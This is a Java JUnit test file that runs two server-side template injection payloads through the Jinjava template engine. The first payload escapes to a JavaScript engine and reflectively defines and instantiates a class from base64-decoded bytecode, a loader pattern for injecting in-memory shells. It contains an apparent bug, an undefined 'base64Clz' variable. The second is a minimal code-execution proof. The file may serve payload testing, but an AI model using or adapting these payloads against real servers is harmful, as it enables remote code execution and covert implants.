import com.google.common.collect.Maps;
import com.hubspot.jinjava.Jinjava;
import org.junit.jupiter.api.Test;

import java.util.Map;

/**
 * @author ReaJason
 * @since 2025/1/30
 */
class JinJavaServletTest {

    @Test
    void test() {
        Jinjava jnj = new Jinjava();
        Map<String, Object> context = Maps.newHashMap();
        String render = jnj.render("{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var className = \"org.apache.commons.lang.zKHoq.ImageUtil\";var base64Str = \"\";try { classLoader.loadClass(className).newInstance();} catch (e) { var clsString = classLoader.loadClass(\"java.lang.String\"); var bytecode; try { var clsBase64 = classLoader.loadClass(\"java.util.Base64\"); var clsDecoder = classLoader.loadClass(\"java.util.Base64$Decoder\"); var decoder = clsBase64.getMethod(\"getDecoder\").invoke(base64Clz); bytecode = clsDecoder.getMethod(\"decode\", clsString).invoke(decoder, base64Str); } catch (ee) { try { var datatypeConverterClz = classLoader.loadClass(\"javax.xml.bind.DatatypeConverter\"); bytecode = datatypeConverterClz.getMethod(\"parseBase64Binary\", clsString).invoke(datatypeConverterClz, base64Str); } catch (eee) { var clazz1 = classLoader.loadClass(\"sun.misc.BASE64Decoder\"); bytecode = clazz1.newInstance().decodeBuffer(base64Str); } } var clsClassLoader = classLoader.loadClass(\"java.lang.ClassLoader\"); var clsByteArray = (new java.lang.String(\"a\").getBytes().getClass()); var clsInt = java.lang.Integer.TYPE; var defineClass = clsClassLoader.getDeclaredMethod(\"defineClass\", [clsByteArray, clsInt, clsInt]); defineClass.setAccessible(true); var clazz = defineClass.invoke(classLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length)); clazz.newInstance();}')}}", context);
        System.out.println(render);
    }

    @Test
    void test2() {
        Jinjava jinjava = new Jinjava();
        Map<String, Object> context = Maps.newHashMap();
        String renderedTemplate = jinjava.render("{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('1+1')) }}", context);
        System.out.println(renderedTemplate);
    }
}